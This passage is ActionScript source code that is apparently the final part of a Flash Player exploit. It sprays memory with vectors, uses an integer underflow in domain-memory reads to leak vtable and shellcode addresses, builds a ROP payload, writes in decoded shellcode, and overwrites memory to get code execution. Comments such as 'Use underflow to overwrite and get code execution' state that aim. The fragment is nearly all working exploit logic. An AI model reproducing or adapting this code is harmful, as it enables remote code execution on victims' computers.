			{
				vector_byte_arrays[i++] = null;
			};
			i = 0;
			while (i < 0x8000)
			{
				vector_objects[i] = new <Object>[i, twos_object, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1];
				i++;
			};
			// _local_6 => nil => 0, makes li32(_local_6 - offset) makes it underflow!
			// Example leak:  0275ef00 => 10c4f508 0000003b 00002326
			if (((!((li16((_local_6 + 1)) == 114))) && (((vftable_addr = li32((_local_6 - 0x0100)) ) == 305419896))))
			{
			};
			if (((!((li16((_local_6 + 1)) == 114))) && (((vector_objects_entry_idx = li32((_local_6 - 248)) ) == 305419896))))
			{
			};
			vector_objects_entry_idx = (vector_objects_entry_idx >> 3);
			if (((!((li16((_local_6 + 1)) == 114))) && (((vector_objects_entry_length = li32((_local_6 - 252)) ) == 305419896))))
			{
			};
			
			// No success
			if (vector_objects_entry_length != vector_objects[vector_objects_entry_idx].length)
			{
				vickers_byte_array = null;
				vector_byte_arrays[length_vector_byte_arrays] = null;
				i = 0;
				while (i < vector_objects.length)
				{
					vector_objects[i++] = null;
				};
				return (false);
			};
			
			i = 0;
			while (i < vector_objects.length)
			{
				if (i != vector_objects_entry_idx)
				{
					vector_objects[i] = null;
				};
				i++;
			};
			// Use underflow to leak shellcode address
			if (((!((li16((_local_6 + 1)) == 114))) && (((shellcode_address = li32((_local_6 - 0x0200)) ) == 305419896))))
			{
			};
			shellcode_address = (shellcode_address + 0x1300);
			var rop_payload:ByteArray = makePayload(vftable_addr, shellcode_address);
			if (rop_payload == null)
			{
				return (true);
			};
			var j:uint;
			var shellcode_length:uint = shellcode.length;
			var shellcode_byte_array:ByteArray = new ByteArray();
			shellcode_byte_array.endian = "littleEndian";
			while (j < shellcode_length)
			{
				shellcode_byte = (shellcode.charAt(j) + shellcode.charAt((j + 1)));
				shellcode_byte_array.writeByte(parseInt(shellcode_byte, 16));
				j = (j + 2);
			};
			vector_byte_arrays[length_vector_byte_arrays].position = 0;
			vector_byte_arrays[length_vector_byte_arrays].endian = "littleEndian";
			vector_byte_arrays[length_vector_byte_arrays].writeBytes(rop_payload);
			vector_byte_arrays[length_vector_byte_arrays].writeBytes(shellcode_byte_array);
			// Use underflow to overwrite and get code execution
			if (li16((_local_6 + 1)) != 114)
			{
				si32((shellcode_address + 1), (_local_6 - 244));
			};
			vector_objects[vector_objects_entry_idx][1][0];
			return (true);
		}
		
		
	}
}//package